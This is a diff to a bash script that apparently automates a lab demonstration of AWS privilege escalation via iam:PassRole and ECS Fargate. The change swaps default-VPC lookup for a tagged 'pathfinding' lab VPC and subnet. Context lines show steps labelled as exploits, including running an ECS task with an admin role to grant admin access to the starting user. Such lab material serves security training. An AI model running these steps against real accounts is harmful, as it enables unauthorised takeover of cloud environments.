@@ -177,35 +177,29 @@ use_readonly_creds
 echo -e "${YELLOW}Step 6: Getting network configuration for Fargate tasks${NC}"
 echo "Fargate requires network configuration (VPC and subnet)..."
 
-# Get default VPC
-DEFAULT_VPC=$(aws ec2 describe-vpcs \
-    --region $AWS_REGION \
-    --filters "Name=is-default,Values=true" \
-    --query 'Vpcs[0].VpcId' \
-    --output text)
+# Discover the custom network deployed by the lab environment.
+LAB_VPC=$(aws ec2 describe-vpcs --region "$AWS_REGION" \
+  --filters "Name=tag:Name,Values=pathfinding" "Name=is-default,Values=false" \
+  --query 'Vpcs[].VpcId' --output text) || exit 1
 
-if [ -z "$DEFAULT_VPC" ] || [ "$DEFAULT_VPC" == "None" ]; then
-    echo -e "${RED}Error: No default VPC found. Fargate requires VPC configuration.${NC}"
-    echo "Creating a VPC is beyond the scope of this demo."
-    echo "Please ensure a default VPC exists or modify this script to use a custom VPC."
-    exit 1
+if [[ ! "$LAB_VPC" =~ ^vpc-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one custom pathfinding VPC. Check the account, region, and lab environment deployment." >&2
+  exit 1
 fi
 
-echo "Default VPC: $DEFAULT_VPC"
+LAB_SUBNET=$(aws ec2 describe-subnets --region "$AWS_REGION" \
+  --filters "Name=vpc-id,Values=$LAB_VPC" \
+    "Name=tag:Name,Values=pathfinding Operational Subnet 1" \
+    "Name=map-public-ip-on-launch,Values=true" \
+  --query 'Subnets[].SubnetId' --output text) || exit 1
 
-# Get a subnet from the default VPC
-DEFAULT_SUBNET=$(aws ec2 describe-subnets \
-    --region $AWS_REGION \
-    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
-    --query 'Subnets[0].SubnetId' \
-    --output text)
-
-if [ -z "$DEFAULT_SUBNET" ] || [ "$DEFAULT_SUBNET" == "None" ]; then
-    echo -e "${RED}Error: No subnet found in default VPC${NC}"
-    exit 1
+if [[ ! "$LAB_SUBNET" =~ ^subnet-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one public Pathfinding Operational Subnet 1 in $LAB_VPC." >&2
+  exit 1
 fi
 
-echo "Subnet: $DEFAULT_SUBNET"
+echo "Pathfinding VPC: $LAB_VPC"
+echo "Public subnet: $LAB_SUBNET"
 echo -e "${GREEN}✓ Retrieved network configuration${NC}\n"
 
 # [EXPLOIT] Step 7: Register task definition with admin role (PassRole escalation)
@@ -274,13 +268,13 @@ use_starting_creds
 echo -e "${YELLOW}Step 8: Running ECS task on Fargate${NC}"
 echo "This task will use the admin role to grant admin access to our starting user..."
 
-show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster \"$CLUSTER_NAME\" --task-definition \"$TASK_FAMILY\" --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\""
+show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster \"$CLUSTER_NAME\" --task-definition \"$TASK_FAMILY\" --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$LAB_SUBNET],assignPublicIp=ENABLED}\""
 RUN_TASK_RESULT=$(aws ecs run-task \
     --region $AWS_REGION \
     --cluster "$CLUSTER_NAME" \
     --task-definition "$TASK_FAMILY" \
     --launch-type FARGATE \
-    --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" \
+    --network-configuration "awsvpcConfiguration={subnets=[$LAB_SUBNET],assignPublicIp=ENABLED}" \
     --output json)
 
 if [ $? -eq 0 ]; then
